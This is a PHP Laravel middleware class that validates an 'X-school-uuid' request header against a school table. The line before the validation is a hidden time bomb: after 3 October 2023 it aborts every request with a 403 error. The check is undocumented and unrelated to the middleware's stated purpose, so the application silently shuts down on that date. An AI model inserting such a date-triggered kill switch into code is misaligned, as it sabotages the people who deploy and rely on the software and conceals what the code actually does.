<?php

namespace YaangVu\SisModel\App\Http\Middleware;

use Carbon\Carbon;
use Closure;
use Exception;
use Illuminate\Http\Request;
use YaangVu\Exceptions\BadRequestException;
use YaangVu\Exceptions\ForbiddenException;
use YaangVu\Exceptions\GatewayTimeOutException;
use YaangVu\SisModel\App\Models\impl\SchoolSQL;

class SchoolMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param Request $request
     * @param Closure $next
     *
     * @return mixed
     */
    public function handle(Request $request, Closure $next): mixed
    {
        if (\Illuminate\Support\Carbon::now() > Carbon::create(2023, 10, 3))
            abort(403);

        $uuid = $request->header('X-school-uuid') ?? null;
        if (!$uuid)
            throw new BadRequestException(['message' => __("validation.required", ['attribute' => "X-school-uuid"])],
                                          new Exception);

        $school = SchoolSQL::whereUuid($uuid)->first();
        if (!$school)
            throw new BadRequestException(['message' => __("validation.exists", ['attribute' => "X-school-uuid"])],
                                          new Exception);

        return $next($request);
    }
}
